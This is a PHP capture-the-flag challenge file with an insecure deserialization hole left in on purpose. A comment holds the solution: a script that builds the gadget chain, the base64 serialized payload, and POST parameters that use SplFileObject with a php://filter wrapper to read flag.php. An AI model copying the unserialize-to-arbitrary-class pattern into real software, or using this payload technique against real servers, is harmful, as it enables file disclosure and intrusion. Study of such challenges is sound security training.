<?php
error_reporting(0);
highlight_file(__FILE__);
// flag.php
class teacher
{
    public $name;
    public $rank;
    private $salary;
    public function __construct($name, $rank, $salary = 10000)
    {
        $this->name = $name;
        $this->rank = $rank;
        $this->salary = $salary;
    }
}

class classroom
{
    public $name;
    public $leader;
    public function __construct($name, $leader)
    {
        $this->name = $name;
        $this->leader = $leader;
    }
    public function hahaha()
    {
        if ($this->name != 'one class' or $this->leader->name != 'ing' or $this->leader->rank != 'department') {
            return False;
        } else {
            return True;
        }
    }
}

class school
{
    public $department;
    public $headmaster;
    public function __construct($department, $ceo)
    {
        $this->department = $department;
        $this->headmaster = $ceo;
    }
    public function IPO()
    {
        if ($this->headmaster == 'ong') {
            echo "Pretty Good ! Ctfer!\n";
            echo new $_POST['a']($_POST['b']);
        }
    }
    public function __wakeup()
    {
        if ($this->department->hahaha()) {
            $this->IPO();
        }
    }
}

if (isset($_GET['d'])) {
    unserialize(base64_decode($_GET['d']));
}


/*

    生成反序列
<?php
	
class teacher{
    public $name;
    public $rank;
    public function __construct(){
        $this->name = 'ing';
        $this->rank = 'department';
    }
}

class classroom{
    public $name;
    public $leader;
    public function __construct(){
        $this->name = 'one class';
        $this->leader = new teacher;
    }
}

class school{
    public $department;
    public $headmaster;
    public function __construct(){
        $this->department = new classroom;
        $this->headmaster = 'ong';
    }
}

$a = new school;
echo base64_encode(serialize($a));

# 结果：Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjoyOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO319czoxMDoiaGVhZG1hc3RlciI7czozOiJvbmciO30

?>

    然后使用创建一个新对象来获取flag：new $_POST['a']($_POST['b']);
    利用原生类：SplFileObject
    在使用伪协议读取文件：php://filter/read=convert.base64-encode/resource=flag.php
    POST传入参数：a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=flag.php
*/